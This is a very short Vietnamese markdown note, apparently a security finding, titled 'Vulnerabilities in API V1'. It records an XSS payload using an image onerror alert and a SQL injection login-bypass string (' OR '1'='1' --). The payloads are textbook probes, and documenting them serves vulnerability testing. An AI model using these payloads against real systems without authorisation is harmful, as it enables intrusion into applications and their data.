# Các lỗ hổng trong API V1

#### XSS
Payload:
```
<img src="x" onerror="alert(&quot;XSS&quot;)">
```

#### SQLi
Payload:
```
' OR '1'='1' -- '
' OR '1'='1' -- '

```